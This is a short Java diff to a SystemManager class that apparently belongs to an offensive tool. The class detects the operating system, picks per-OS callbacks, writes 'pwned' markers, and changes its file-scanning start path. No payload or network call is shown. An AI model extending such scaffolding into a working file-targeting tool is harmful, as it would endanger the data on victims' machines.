@@ -16,21 +16,26 @@ public class SystemManager {
 	private Supplier<List<String>> callback;
 
 	private String state;
+	public String operatingSystem;
 	
 	public SystemManager() {
 		System.out.println("[ + ] - Scanning System");
 		String os = System.getProperty("os.name").toLowerCase();
 		if (os.contains("win")) {
 			callback = Configuration.getWindowsCallback();
+			this.operatingSystem = "windows";
 			state = "pwned";
 		} else if (os.contains("osx")) {
 			callback = Configuration.getMacosCallback();
 			this.state = "/tmp/pwned";
+			this.operatingSystem = "macos";
 		} else if (os.contains("nix") || os.contains("aix") || os.contains("nux")) {
 			callback = Configuration.getLinuxCallback();
 			this.state = "/tmp/pwned";
+			this.operatingSystem = "linux";
 		} else {
 			callback = Configuration.getWindowsCallback();
+			this.operatingSystem = "windows";
 		}
 	}
 
@@ -43,12 +48,11 @@ public class SystemManager {
 	}
 
 	public String[] getStartPath() {
-		return new String[] { "/c" };
-		/*
-		 * File[] paths = File.listRoots(); String[] startPaths = new
-		 * String[paths.length]; for (int i = 0; i < startPaths.length; i++) {
-		 * startPaths[i] = paths[i].getAbsolutePath(); } return startPaths;
-		 */
+		return new String[] { "files" };
+	}
+	
+	public String getOsType() {
+		return this.operatingSystem;
 	}
 	
 	public String getConfigPath() {
